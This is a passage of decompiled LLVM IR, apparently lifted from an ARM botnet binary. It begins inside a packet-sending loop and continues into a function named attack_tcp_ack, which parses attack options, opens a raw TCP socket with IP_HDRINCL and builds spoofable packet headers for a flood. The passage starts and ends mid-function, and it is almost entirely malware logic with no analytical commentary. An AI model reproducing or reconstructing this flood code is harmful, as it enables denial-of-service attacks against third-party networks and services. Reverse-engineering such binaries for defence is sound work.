  %v4_a7f0 = inttoptr i32 %v3_a7f0 to i16*
  store i16 %v3_a7e8, i16* %v4_a7f0, align 2
  store i32 16384, i32* %r3.global-to-local, align 4
  store i32 16, i32* %ip.global-to-local, align 4
  %v0_a7fc = load i32, i32* @r4, align 4
  store i32 %v0_a7fc, i32* %r1.global-to-local, align 4
  %v0_a800 = load i32, i32* @sb, align 4
  store i32 %v0_a800, i32* %r0.global-to-local, align 4
  %v0_a804 = load i32, i32* @r7, align 4
  store i32 %v0_a804, i32* %r2.global-to-local, align 4
  %v0_a808 = load i32, i32* @lr, align 4
  %v6_a810 = call i32 @__libc_sendto(i32 %v0_a800, i32 %v0_a7fc, i32 %v0_a804, i32 16384, i32 %v0_a808, i32 16)
  %v3_a814 = load i32, i32* %stack_var_-44, align 4
  store i32 %v3_a814, i32* %r3.global-to-local, align 4
  %v1_a818 = add i32 %v3_a814, 1
  store i32 %v1_a818, i32* %r0.global-to-local, align 4
  %v0_a81c = load i32, i32* @r6, align 4
  %v9_a81c = icmp eq i32 %v0_a81c, %v1_a818
  store i1 %v9_a81c, i1* %cpsr_z.global-to-local, align 1
  store i32 %v1_a818, i32* %stack_var_-44, align 4
  %v8_a824 = icmp sgt i32 %v0_a81c, %v1_a818
  br i1 %v8_a824, label %dec_label_pc_a730, label %dec_label_pc_a828

dec_label_pc_a828:                                ; preds = %dec_label_pc_a758
  store i32 0, i32* %r3.global-to-local, align 4
  %v2_a82c = icmp eq i32 %v0_a81c, 0
  store i1 %v2_a82c, i1* %cpsr_z.global-to-local, align 1
  store i32 0, i32* %stack_var_-44, align 4
  br i1 %v2_a82c, label %dec_label_pc_a71c, label %dec_label_pc_a72c

dec_label_pc_a83c:                                ; preds = %dec_label_pc_a730
  %v0_a83c = call i32 @rand_next()
  %v1_a83c = trunc i32 %v0_a83c to i16
  store i32 %v0_a83c, i32* %r0.global-to-local, align 4
  store i32 %v1_a270, i32* %r3.global-to-local, align 4
  store i1 %v2_a844, i1* %cpsr_z.global-to-local, align 1
  %v3_a848 = load i32, i32* @r4, align 4
  %v4_a848 = add i32 %v3_a848, 4
  %v5_a848 = inttoptr i32 %v4_a848 to i16*
  store i16 %v1_a83c, i16* %v5_a848, align 2
  br i1 %v2_a844, label %dec_label_pc_a758, label %dec_label_pc_a83c.dec_label_pc_a850_crit_edge

dec_label_pc_a83c.dec_label_pc_a850_crit_edge:    ; preds = %dec_label_pc_a83c
  %v0_a850.pre = load i32, i32* @r4, align 4
  br label %dec_label_pc_a850

dec_label_pc_a850:                                ; preds = %dec_label_pc_a83c.dec_label_pc_a850_crit_edge, %dec_label_pc_a74c
  %v0_a850 = phi i32 [ %v0_a850.pre, %dec_label_pc_a83c.dec_label_pc_a850_crit_edge ], [ %v7_a738, %dec_label_pc_a74c ]
  %v1_a850 = add i32 %v0_a850, 40
  store i32 %v1_a850, i32* %r0.global-to-local, align 4
  store i32 %v6_a250, i32* %r1.global-to-local, align 4
  %v2_a858 = inttoptr i32 %v1_a850 to i16*
  %v3_a858 = call i32 @rand_str(i16* %v2_a858, i32 %v6_a250)
  store i32 %v3_a858, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_a758

; uselistorder directives
  uselistorder i32 %v0_a83c, { 1, 0 }
  uselistorder i32 %v1_a818, { 2, 0, 3, 4, 1 }
  uselistorder i32 %v5_a7e4, { 1, 0 }
  uselistorder i32 %v4_a7d0, { 1, 0 }
  uselistorder i32 %v3_a79c, { 1, 0 }
  uselistorder i32 %v3_a77c, { 3, 2, 0, 1 }
  uselistorder i32 %v2_a768, { 1, 0 }
  uselistorder i1 %v2_a844, { 2, 3, 1, 0 }
  uselistorder i32 %v0_a654, { 1, 0 }
  uselistorder i32 %v0_a58c, { 1, 0 }
  uselistorder i32 %v5_a520, { 1, 0 }
  uselistorder i32 %v0_a4e0, { 1, 0 }
  uselistorder i32 %v0_a49c, { 1, 2, 0, 3 }
  uselistorder i32 %v1_a44c, { 1, 0, 2, 3 }
  uselistorder i32 %v3_a438, { 1, 0, 3, 4, 2 }
  uselistorder i1 %v7_a3c4, { 1, 0 }
  uselistorder i32 %v6_a3bc, { 0, 2, 1, 3 }
  uselistorder i1 %v9_a3ec, { 1, 0 }
  uselistorder i32 %v4_a400, { 1, 0 }
  uselistorder i16 %stack_var_-62.2, { 0, 1, 3, 2 }
  uselistorder i32 %v0_a348, { 1, 0, 2 }
  uselistorder i32 %v0_a4f8, { 1, 0, 2, 4, 5, 3 }
  uselistorder i32 %v4_a338, { 1, 0 }
  uselistorder i1 %v7_a330, { 1, 0, 2 }
  uselistorder i1 %v7_a2e4, { 1, 0 }
  uselistorder i32 %v3_a2e0, { 1, 2, 0, 3 }
  uselistorder i32 %stack_var_-60.0, { 1, 0 }
  uselistorder i16 %stack_var_-62.0, { 1, 0 }
  uselistorder i32 %v1_a6c0, { 1, 0 }
  uselistorder i32 %v1_a6a8, { 1, 0 }
  uselistorder i32 %v1_a690, { 1, 0 }
  uselistorder i32 %v1_a678, { 1, 0 }
  uselistorder i32 %v1_a660, { 1, 0 }
  uselistorder i32 %v3_a3f8, { 1, 0 }
  uselistorder i1 %v2_a414, { 1, 0 }
  uselistorder i32 %v1_a410, { 1, 0 }
  uselistorder i32 %v4_a40c, { 2, 0, 1 }
  uselistorder i32 %v2_a320, { 3, 2, 1, 4, 0 }
  uselistorder i32 %v0_a2bc, { 1, 0 }
  uselistorder i1 %v7_a2b4, { 1, 0 }
  uselistorder i1 %v7_a288, { 1, 0 }
  uselistorder i32 %v3_a284, { 1, 2, 3, 0, 4 }
  uselistorder i32 %v1_a270, { 2, 3, 1, 0 }
  uselistorder i32 %v6_a250, { 9, 8, 2, 0, 1, 10, 5, 4, 6, 7, 3 }
  uselistorder i32 %v1_a238, { 1, 2, 0 }
  uselistorder i32 %v1_a218, { 1, 2, 0 }
  uselistorder i32 %v1_a1f8, { 1, 2, 0 }
  uselistorder i32 %v1_a1d8, { 1, 2, 0 }
  uselistorder i32 %v1_a1b8, { 1, 2, 0 }
  uselistorder i32 %v1_a198, { 1, 2, 0 }
  uselistorder i32 %v6_a174, { 1, 0 }
  uselistorder i32 %v1_a15c, { 1, 2, 0 }
  uselistorder i32 %v6_a0f4, { 2, 1, 3, 0 }
  uselistorder i32 %v2_a0dc, { 0, 3, 1, 2, 4 }
  uselistorder i32 %v2_a0cc, { 0, 7, 1, 4, 2, 5, 3, 6 }
  uselistorder i32* %stack_var_-44, { 0, 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 15, 14 }
  uselistorder i32* %r3.global-to-local, { 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26, 27, 28, 29, 30, 31, 32, 33, 34, 35, 36, 37, 38, 39, 40, 41, 42, 43, 44, 45, 46, 47, 48, 49, 50, 51, 52, 53, 54, 55, 56, 57, 58, 59, 60, 61, 0 }
  uselistorder i32* %r2.global-to-local, { 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 21, 20, 22, 23, 24, 25, 26, 27, 28, 29, 30, 31, 33, 32, 34, 35, 36, 37, 38, 39, 40, 41, 43, 42, 44, 45, 46, 47, 48, 49, 50, 51, 52, 53, 54, 0 }
  uselistorder i32* %r1.global-to-local, { 50, 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26, 27, 28, 29, 30, 31, 32, 33, 34, 35, 36, 37, 38, 39, 40, 41, 43, 42, 44, 46, 45, 47, 49, 48, 0 }
  uselistorder i32* %r0.global-to-local, { 56, 55, 2, 1, 3, 5, 4, 7, 6, 9, 8, 14, 10, 11, 12, 13, 17, 15, 16, 19, 18, 20, 23, 22, 21, 24, 25, 26, 28, 29, 27, 30, 32, 31, 33, 34, 35, 37, 36, 38, 40, 39, 41, 42, 43, 44, 45, 46, 47, 48, 49, 50, 51, 52, 53, 54, 0 }
  uselistorder i32* %ip.global-to-local, { 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 0, 21, 22, 23, 24, 25, 26, 27, 28, 29, 30, 31, 32 }
  uselistorder i1* %cpsr_z.global-to-local, { 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 15, 0, 16, 17, 14, 18, 19, 20, 21, 22, 23 }
  uselistorder i32 %arg2, { 3, 0, 1, 2, 4 }
  uselistorder i32 %arg1, { 1, 0, 2 }
  uselistorder label %dec_label_pc_a758, { 2, 1, 0 }
  uselistorder label %dec_label_pc_a72c, { 1, 0 }
  uselistorder label %dec_label_pc_a71c, { 1, 0, 2 }
  uselistorder label %dec_label_pc_a70c, { 1, 0 }
  uselistorder label %bb81, { 1, 0 }
  uselistorder label %bb79, { 1, 0 }
  uselistorder label %dec_label_pc_a478, { 2, 0, 1 }
  uselistorder label %dec_label_pc_a448, { 2, 0, 1 }
  uselistorder label %dec_label_pc_a384, { 2, 1, 3, 0 }
  uselistorder label %dec_label_pc_a364, { 1, 0 }
  uselistorder label %dec_label_pc_a340, { 1, 0 }
  uselistorder label %bb71, { 1, 0 }
  uselistorder label %dec_label_pc_a2f0, { 1, 0 }
  uselistorder label %dec_label_pc_a2d4, { 1, 0 }
}

define i32 @attack_tcp_ack(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %cpsr_z.global-to-local = alloca i1, align 1
  %fp.global-to-local = alloca i32, align 4
  %ip.global-to-local = alloca i32, align 4
  %lr.global-to-local = alloca i32, align 4
  %r0.global-to-local = alloca i32, align 4
  %r1.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  %sb.global-to-local = alloca i32, align 4
  store i32 %arg4, i32* %r3.global-to-local, align 4
  store i32 %arg3, i32* %r2.global-to-local, align 4
  store i32 %arg2, i32* %r1.global-to-local, align 4
  store i32 %arg1, i32* %r0.global-to-local, align 4
  %stack_var_-44 = alloca i32, align 4
  %v18_a864 = load i32, i32* @sb, align 4
  %v24_a864 = load i32, i32* @fp, align 4
  %v27_a864 = load i32, i32* @lr, align 4
  store i32 %arg2, i32* @r8, align 4
  store i32 4, i32* %r1.global-to-local, align 4
  store i32 %arg3, i32* @r4, align 4
  store i32 %arg4, i32* @r5, align 4
  store i32 %arg1, i32* @r7, align 4
  %v2_a880 = call i32 @calloc(i32 %arg1, i32 4)
  %v0_a884 = load i32, i32* @r5, align 4
  store i32 %v0_a884, i32* %r1.global-to-local, align 4
  store i32 2, i32* %r2.global-to-local, align 4
  store i32 0, i32* %r3.global-to-local, align 4
  %v0_a894 = load i32, i32* @r4, align 4
  store i32 %v0_a894, i32* %r0.global-to-local, align 4
  %v5_a898 = inttoptr i32 %v0_a884 to i32*
  %v6_a898 = call i32 @attack_get_opt_int(i32 %v0_a894, i32* %v5_a898, i32 2, i32 0, i32 %v2_a880)
  %v1_a8a4 = urem i32 %v6_a898, 256
  store i32 %v1_a8a4, i32* %ip.global-to-local, align 4
  store i32 add (i32 ptrtoint (i32* @global_var_10000.57 to i32), i32 -1), i32* %r3.global-to-local, align 4
  store i32 3, i32* %r2.global-to-local, align 4
  %v0_a8b0 = load i32, i32* @r5, align 4
  store i32 %v0_a8b0, i32* %r1.global-to-local, align 4
  %v0_a8b4 = load i32, i32* @r4, align 4
  store i32 %v0_a8b4, i32* %r0.global-to-local, align 4
  %sext = mul i32 %v6_a898, 16777216
  %v5_a8bc = sdiv i32 %sext, 16777216
  %v6_a8bc = inttoptr i32 %v0_a8b0 to i32*
  %v7_a8bc = call i32 @attack_get_opt_int(i32 %v0_a8b4, i32* %v6_a8bc, i32 3, i32 add (i32 ptrtoint (i32* @global_var_10000.57 to i32), i32 -1), i32 %v5_a8bc)
  %v0_a8c0 = load i32, i32* @r5, align 4
  store i32 %v0_a8c0, i32* %r1.global-to-local, align 4
  store i32 4, i32* %r2.global-to-local, align 4
  store i32 64, i32* %r3.global-to-local, align 4
  store i32 %v7_a8bc, i32* %sb.global-to-local, align 4
  %v0_a8d0 = load i32, i32* @r4, align 4
  store i32 %v0_a8d0, i32* %r0.global-to-local, align 4
  %v5_a8d4 = inttoptr i32 %v0_a8c0 to i32*
  %v6_a8d4 = call i32 @attack_get_opt_int(i32 %v0_a8d0, i32* %v5_a8d4, i32 4, i32 64, i32 ptrtoint (i32* @0 to i32))
  %v1_a8dc = urem i32 %v6_a8d4, 256
  store i32 %v1_a8dc, i32* %ip.global-to-local, align 4
  %v0_a8e0 = load i32, i32* @r5, align 4
  store i32 %v0_a8e0, i32* %r1.global-to-local, align 4
  store i32 5, i32* %r2.global-to-local, align 4
  store i32 0, i32* %r3.global-to-local, align 4
  %v0_a8ec = load i32, i32* @r4, align 4
  store i32 %v0_a8ec, i32* %r0.global-to-local, align 4
  %sext4 = mul i32 %v6_a8d4, 16777216
  %v5_a8f4 = sdiv i32 %sext4, 16777216
  %v6_a8f4 = inttoptr i32 %v0_a8e0 to i32*
  %v7_a8f4 = call i32 @attack_get_opt_int(i32 %v0_a8ec, i32* %v6_a8f4, i32 5, i32 0, i32 %v5_a8f4)
  %v1_a900 = urem i32 %v7_a8f4, 256
  store i32 %v1_a900, i32* %ip.global-to-local, align 4
  store i32 add (i32 ptrtoint (i32* @global_var_10000.57 to i32), i32 -1), i32* %r3.global-to-local, align 4
  store i32 6, i32* %r2.global-to-local, align 4
  %v0_a90c = load i32, i32* @r5, align 4
  store i32 %v0_a90c, i32* %r1.global-to-local, align 4
  %v0_a910 = load i32, i32* @r4, align 4
  store i32 %v0_a910, i32* %r0.global-to-local, align 4
  %v5_a918 = inttoptr i32 %v0_a90c to i32*
  %v6_a918 = call i32 @attack_get_opt_int(i32 %v0_a910, i32* %v5_a918, i32 6, i32 add (i32 ptrtoint (i32* @global_var_10000.57 to i32), i32 -1), i32 %v1_a900)
  %v0_a920 = load i32, i32* @r5, align 4
  store i32 %v0_a920, i32* %r1.global-to-local, align 4
  store i32 add (i32 ptrtoint (i32* @global_var_10000.57 to i32), i32 -1), i32* %r3.global-to-local, align 4
  store i32 7, i32* %r2.global-to-local, align 4
  store i32 %v6_a918, i32* @r6, align 4
  %v0_a930 = load i32, i32* @r4, align 4
  store i32 %v0_a930, i32* %r0.global-to-local, align 4
  %v5_a934 = inttoptr i32 %v0_a920 to i32*
  %v6_a934 = call i32 @attack_get_opt_int(i32 %v0_a930, i32* %v5_a934, i32 7, i32 add (i32 ptrtoint (i32* @global_var_10000.57 to i32), i32 -1), i32 ptrtoint (i32* @0 to i32))
  %v0_a93c = load i32, i32* @r5, align 4
  store i32 %v0_a93c, i32* %r1.global-to-local, align 4
  store i32 add (i32 ptrtoint (i32* @global_var_10000.57 to i32), i32 -1), i32* %r3.global-to-local, align 4
  store i32 17, i32* %r2.global-to-local, align 4
  store i32 %v6_a934, i32* @sl, align 4
  %v0_a94c = load i32, i32* @r4, align 4
  store i32 %v0_a94c, i32* %r0.global-to-local, align 4
  %v5_a950 = inttoptr i32 %v0_a93c to i32*
  %v6_a950 = call i32 @attack_get_opt_int(i32 %v0_a94c, i32* %v5_a950, i32 17, i32 add (i32 ptrtoint (i32* @global_var_10000.57 to i32), i32 -1), i32 ptrtoint (i32* @0 to i32))
  %v0_a95c = load i32, i32* @r5, align 4
  store i32 %v0_a95c, i32* %r1.global-to-local, align 4
  store i32 add (i32 ptrtoint (i32* @global_var_10000.57 to i32), i32 -1), i32* %r3.global-to-local, align 4
  store i32 18, i32* %r2.global-to-local, align 4
  %v0_a968 = load i32, i32* @r4, align 4
  store i32 %v0_a968, i32* %r0.global-to-local, align 4
  %v5_a96c = inttoptr i32 %v0_a95c to i32*
  %v6_a96c = call i32 @attack_get_opt_int(i32 %v0_a968, i32* %v5_a96c, i32 18, i32 add (i32 ptrtoint (i32* @global_var_10000.57 to i32), i32 -1), i32 %v6_a950)
  %v0_a970 = load i32, i32* @r5, align 4
  store i32 %v0_a970, i32* %r1.global-to-local, align 4
  store i32 11, i32* %r2.global-to-local, align 4
  store i32 0, i32* %r3.global-to-local, align 4
  %v0_a980 = load i32, i32* @r4, align 4
  store i32 %v0_a980, i32* %r0.global-to-local, align 4
  %v5_a984 = inttoptr i32 %v0_a970 to i32*
  %v6_a984 = call i32 @attack_get_opt_int(i32 %v0_a980, i32* %v5_a984, i32 11, i32 0, i32 %v6_a96c)
  %v0_a988 = load i32, i32* @r5, align 4
  store i32 %v0_a988, i32* %r1.global-to-local, align 4
  store i32 12, i32* %r2.global-to-local, align 4
  store i32 1, i32* %r3.global-to-local, align 4
  %v0_a998 = load i32, i32* @r4, align 4
  store i32 %v0_a998, i32* %r0.global-to-local, align 4
  %v5_a99c = inttoptr i32 %v0_a988 to i32*
  %v6_a99c = call i32 @attack_get_opt_int(i32 %v0_a998, i32* %v5_a99c, i32 12, i32 1, i32 %v6_a984)
  %v0_a9a0 = load i32, i32* @r5, align 4
  store i32 %v0_a9a0, i32* %r1.global-to-local, align 4
  store i32 13, i32* %r2.global-to-local, align 4
  store i32 0, i32* %r3.global-to-local, align 4
  %v0_a9b0 = load i32, i32* @r4, align 4
  store i32 %v0_a9b0, i32* %r0.global-to-local, align 4
  %v5_a9b4 = inttoptr i32 %v0_a9a0 to i32*
  %v6_a9b4 = call i32 @attack_get_opt_int(i32 %v0_a9b0, i32* %v5_a9b4, i32 13, i32 0, i32 %v6_a99c)
  %v0_a9b8 = load i32, i32* @r5, align 4
  store i32 %v0_a9b8, i32* %r1.global-to-local, align 4
  store i32 14, i32* %r2.global-to-local, align 4
  store i32 0, i32* %r3.global-to-local, align 4
  %v0_a9c8 = load i32, i32* @r4, align 4
  store i32 %v0_a9c8, i32* %r0.global-to-local, align 4
  %v5_a9cc = inttoptr i32 %v0_a9b8 to i32*
  %v6_a9cc = call i32 @attack_get_opt_int(i32 %v0_a9c8, i32* %v5_a9cc, i32 14, i32 0, i32 %v6_a9b4)
  %v0_a9d0 = load i32, i32* @r5, align 4
  store i32 %v0_a9d0, i32* %r1.global-to-local, align 4
  store i32 15, i32* %r2.global-to-local, align 4
  store i32 0, i32* %r3.global-to-local, align 4
  %v0_a9e0 = load i32, i32* @r4, align 4
  store i32 %v0_a9e0, i32* %r0.global-to-local, align 4
  %v5_a9e4 = inttoptr i32 %v0_a9d0 to i32*
  %v6_a9e4 = call i32 @attack_get_opt_int(i32 %v0_a9e0, i32* %v5_a9e4, i32 15, i32 0, i32 %v6_a9cc)
  %v0_a9e8 = load i32, i32* @r5, align 4
  store i32 %v0_a9e8, i32* %r1.global-to-local, align 4
  store i32 16, i32* %r2.global-to-local, align 4
  store i32 0, i32* %r3.global-to-local, align 4
  %v0_a9f8 = load i32, i32* @r4, align 4
  store i32 %v0_a9f8, i32* %r0.global-to-local, align 4
  %v5_a9fc = inttoptr i32 %v0_a9e8 to i32*
  %v6_a9fc = call i32 @attack_get_opt_int(i32 %v0_a9f8, i32* %v5_a9fc, i32 16, i32 0, i32 %v6_a9e4)
  %v0_aa00 = load i32, i32* @r5, align 4
  store i32 %v0_aa00, i32* %r1.global-to-local, align 4
  store i32 0, i32* %r2.global-to-local, align 4
  store i32 512, i32* %r3.global-to-local, align 4
  %v0_aa10 = load i32, i32* @r4, align 4
  store i32 %v0_aa10, i32* %r0.global-to-local, align 4
  %v5_aa14 = inttoptr i32 %v0_aa00 to i32*
  %v6_aa14 = call i32 @attack_get_opt_int(i32 %v0_aa10, i32* %v5_aa14, i32 0, i32 512, i32 %v6_a9fc)
  store i32 1, i32* %r2.global-to-local, align 4
  store i32 1, i32* %r3.global-to-local, align 4
  %v0_aa24 = load i32, i32* @r5, align 4
  store i32 %v0_aa24, i32* %r1.global-to-local, align 4
  %v0_aa28 = load i32, i32* @r4, align 4
  store i32 %v0_aa28, i32* %r0.global-to-local, align 4
  %v5_aa2c = inttoptr i32 %v0_aa24 to i32*
  %v6_aa2c = call i32 @attack_get_opt_int(i32 %v0_aa28, i32* %v5_aa2c, i32 1, i32 1, i32 ptrtoint (i32* @0 to i32))
  %v2_aa38 = load i32, i32* @global_var_24f78.59, align 4
  store i32 %v2_aa38, i32* %r3.global-to-local, align 4
  %v1_aa3c = urem i32 %v6_aa2c, 256
  store i32 %v1_aa3c, i32* %ip.global-to-local, align 4
  %v0_aa40 = load i32, i32* @r5, align 4
  store i32 %v0_aa40, i32* %r1.global-to-local, align 4
  store i32 25, i32* %r2.global-to-local, align 4
  %v0_aa48 = load i32, i32* @r4, align 4
  store i32 %v0_aa48, i32* %r0.global-to-local, align 4
  %v5_aa50 = inttoptr i32 %v0_aa40 to i32*
  %v6_aa50 = call i32 @attack_get_opt_ip(i32 %v0_aa48, i32* %v5_aa50, i32 25, i32 %v2_aa38, i32 %v1_aa3c)
  store i32 3, i32* %r1.global-to-local, align 4
  store i32 6, i32* %r2.global-to-local, align 4
  store i32 2, i32* %r0.global-to-local, align 4
  %v3_aa64 = call i32 @socket(i32 2, i32 3, i32 6)
  store i32 %v3_aa64, i32* %r0.global-to-local, align 4
  %v7_aa68 = icmp eq i32 %v3_aa64, -1
  store i1 %v7_aa68, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_aa68, label %dec_label_pc_af30, label %dec_label_pc_aa74

dec_label_pc_aa74:                                ; preds = %entry
  store i32 1, i32* %stack_var_-44, align 4
  %v6_aa7c = ptrtoint i32* %stack_var_-44 to i32
  store i32 %v6_aa7c, i32* %r3.global-to-local, align 4
  store i32 4, i32* %ip.global-to-local, align 4
  store i32 0, i32* @r1, align 4
  store i32 3, i32* %r2.global-to-local, align 4
  %v5_aa90 = call i32 @__GI_setsockopt(i32 %v3_aa64, i32 0, i32 3, i32 %v6_aa7c, i32 4)
  store i32 %v5_aa90, i32* %r0.global-to-local, align 4
  %v7_aa94 = icmp eq i32 %v5_aa90, -1
  store i1 %v7_aa94, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_aa94, label %dec_label_pc_af28, label %dec_label_pc_aa9c

dec_label_pc_aa9c:                                ; preds = %dec_label_pc_aa74
  %v0_aa9c = load i32, i32* %sb.global-to-local, align 4
  %v3_aa9c = mul i32 %v0_aa9c, 65536
  store i32 %v3_aa9c, i32* @r5, align 4
  %v0_aaa0 = load i32, i32* @r6, align 4
  %v0_aaa4 = load i32, i32* @sl, align 4
  store i32 0, i32* %r0.global-to-local, align 4
  %v3_aaac = urem i32 %v0_aa9c, 65536
  store i32 %v3_aaac, i32* %r1.global-to-local, align 4
  %v3_aab0 = urem i32 %v0_aaa0, 65536
  store i32 %v3_aab0, i32* %r2.global-to-local, align 4
  %v3_aab4 = urem i32 %v0_aaa4, 65536
  store i32 %v3_aab4, i32* %r3.global-to-local, align 4
  %v0_aab8 = load i32, i32* @r7, align 4
  %v2_aab8 = icmp eq i32 %v0_aab8, 0
  store i1 %v2_aab8, i1* %cpsr_z.global-to-local, align 1
  store i32 0, i32* %stack_var_-44, align 4
  br i1 %v2_aab8, label %dec_label_pc_af3c, label %dec_label_pc_aad0

dec_label_pc_aad0:                                ; preds = %dec_label_pc_aa9c
  %v3_aad4 = mul i32 %v6_aa14, 65536
  %v1_aad8 = add i32 %v3_aad4, 2621440
  store i32 %v1_aad8, i32* @lr, align 4
  %tmp59 = mul i32 %v0_aaa0, 256
  %v3_aafc = and i32 %tmp59, 65280
  %tmp60 = mul i32 %v0_aaa4, 256
  %v3_ab00 = and i32 %tmp60, 65280
  %tmp61 = udiv i32 %v0_aaa0, 256
  %v4_ab04 = urem i32 %tmp61, 256
  %v5_ab04 = or i32 %v4_ab04, %v3_aafc
  store i32 %v5_ab04, i32* @r6, align 4
  %tmp62 = udiv i32 %v0_aaa4, 256
  %v4_ab08 = urem i32 %tmp62, 256
  %v5_ab08 = or i32 %v4_ab08, %v3_ab00
  store i32 %v5_ab08, i32* @sl, align 4
  %tmp63 = udiv i32 %v1_aad8, 256
  %v3_ab1c = and i32 %tmp63, 65280
  %tmp64 = mul i32 %v0_aa9c, 256
  %v3_ab20 = and i32 %tmp64, 65280
  %tmp65 = mul i32 %v6_a950, 256
  %v3_ab24 = and i32 %tmp65, 65280
  %v1_ab28 = urem i32 %v6_a984, 2
  %v1_ab2c = urem i32 %v6_a99c, 2
  %tmp66 = udiv i32 %v6_a950, 256
  %v4_ab30 = urem i32 %tmp66, 256
  %v5_ab30 = or i32 %v4_ab30, %v3_ab24
  %v4_ab34 = udiv i32 %v1_aad8, 16777216
  %v5_ab34 = or i32 %v3_ab1c, %v4_ab34
  store i32 %v5_ab34, i32* @sb, align 4
  %tmp67 = udiv i32 %v0_aa9c, 256
  %v4_ab38 = urem i32 %tmp67, 256
  %v5_ab38 = or i32 %v4_ab38, %v3_ab20
  store i32 %v5_ab38, i32* @fp, align 4
  %v1_ab54 = urem i32 %v6_a9b4, 2
  store i32 %v1_ab54, i32* %r2.global-to-local, align 4
  %v1_ab58 = urem i32 %v6_a9cc, 2
  store i32 %v1_ab58, i32* %r3.global-to-local, align 4
  %v1_ab5c = urem i32 %v6_a9e4, 2
  store i32 %v1_ab5c, i32* %ip.global-to-local, align 4
  %v1_ab60 = urem i32 %v6_a9fc, 2
  store i32 %v1_ab60, i32* %r0.global-to-local, align 4
  %v1_ab64 = urem i32 %v6_a9b4, 256
  store i32 %v1_ab64, i32* %r1.global-to-local, align 4
  store i32 0, i32* @r4, align 4
  %tmp = sub nsw i32 0, %v1_ab2c
  %v4_ac50 = and i32 %tmp, 16
  %tmp72 = sub nsw i32 0, %v1_ab54
  %v4_ac6c = and i32 %tmp72, 8
  %tmp73 = sub nsw i32 0, %v1_ab58
  %v4_ac80 = and i32 %tmp73, 4
  %tmp74 = sub nsw i32 0, %v1_ab5c
  %v3_ac94 = and i32 %tmp74, 2
  %v2_acb8 = icmp eq i32 %v1_ab64, 0
  %v1_abe0 = trunc i32 %v5_a8bc to i8
  %extract.t = trunc i32 %v5_a8f4 to i8
  br label %dec_label_pc_ab84

dec_label_pc_ab84:                                ; preds = %bb70, %dec_label_pc_aad0
  store i32 1, i32* %r1.global-to-local, align 4
  store i32 1510, i32* %r0.global-to-local, align 4
  %v2_ab90 = call i32 @calloc(i32 1510, i32 1)
  store i32 %v2_ab90, i32* %r0.global-to-local, align 4
  %v2_ab98 = load i32, i32* @r4, align 4
  %v5_ab98 = mul i32 %v2_ab98, 4
  %v6_ab98 = add i32 %v5_ab98, %v2_a880
  %v7_ab98 = inttoptr i32 %v6_ab98 to i32*
  store i32 %v2_ab90, i32* %v7_ab98, align 4
  %v3_ab9c = load i32, i32* %stack_var_-44, align 4
  store i32 %v3_ab9c, i32* %r2.global-to-local, align 4
  %v5_aba4 = mul i32 %v3_ab9c, 24
  %v1_aba8 = load i32, i32* @r8, align 4
  %v2_aba8 = add i32 %v1_aba8, %v5_aba4
  store i32 %v2_aba8, i32* %r1.global-to-local, align 4
  store i32 %v2_a880, i32* %r3.global-to-local, align 4
  %v4_abb0 = mul i32 %v3_ab9c, 4
  %v5_abb0 = add i32 %v4_abb0, %v2_a880
  %v6_abb0 = inttoptr i32 %v5_abb0 to i32*
  %v7_abb0 = load i32, i32* %v6_abb0, align 4
  store i32 %v7_abb0, i32* @r5, align 4
  %v1_abb4 = inttoptr i32 %v7_abb0 to i8*
  %v2_abb4 = load i8, i8* %v1_abb4, align 1
  %tmp75 = urem i8 %v2_abb4, 16
  %v1_abb8 = zext i8 %tmp75 to i32
  %v1_abbc = or i32 %v1_abb8, 64
  store i32 %v1_abbc, i32* %r3.global-to-local, align 4
  %v1_abc0 = trunc i32 %v1_abbc to i8
  store i8 %v1_abc0, i8* %v1_abb4, align 1
  %v0_abc4 = load i32, i32* @r5, align 4
  %v1_abc4 = inttoptr i32 %v0_abc4 to i8*
  %v2_abc4 = load i8, i8* %v1_abc4, align 1
  %v1_abc8 = and i8 %v2_abc4, -16
  %v1_abcc = or i8 %v1_abc8, 5
  store i32 %v1_a900, i32* %ip.global-to-local, align 4
  store i8 %v1_abcc, i8* %v1_abc4, align 1
  store i32 %v5_a8bc, i32* %r0.global-to-local, align 4
  %v0_abdc = load i32, i32* %ip.global-to-local, align 4
  %v2_abdc = icmp eq i32 %v0_abdc, 0
  store i1 %v2_abdc, i1* %cpsr_z.global-to-local, align 1
  %v2_abe0 = load i32, i32* @r5, align 4
  %v3_abe0 = add i32 %v2_abe0, 1
  %v4_abe0 = inttoptr i32 %v3_abe0 to i8*
  store i8 %v1_abe0, i8* %v4_abe0, align 1
  store i32 %v5_a8f4, i32* %r2.global-to-local, align 4
  %v0_abe8 = load i1, i1* %cpsr_z.global-to-local, align 1
  br i1 %v0_abe8, label %.thread, label %bb

bb:                                               ; preds = %dec_label_pc_ab84
  store i32 64, i32* %r3.global-to-local, align 4
  %v3_abec = load i32, i32* @r5, align 4
  %v4_abec = add i32 %v3_abec, 6
  %v5_abec = inttoptr i32 %v4_abec to i16*
  store i16 64, i16* %v5_abec, align 2
  %v0_abf4.pre = load i32, i32* %r2.global-to-local, align 4
  %extract.t17 = trunc i32 %v0_abf4.pre to i8
  br label %.thread

.thread:                                          ; preds = %dec_label_pc_ab84, %bb
  %v0_abf4.off0 = phi i8 [ %extract.t, %dec_label_pc_ab84 ], [ %extract.t17, %bb ]
  store i32 6, i32* %r3.global-to-local, align 4
  %v2_abf4 = load i32, i32* @r5, align 4
  %v3_abf4 = add i32 %v2_abf4, 8
  %v4_abf4 = inttoptr i32 %v3_abf4 to i8*
  store i8 %v0_abf4.off0, i8* %v4_abf4, align 1
  %v0_abf8 = load i32, i32* %r3.global-to-local, align 4
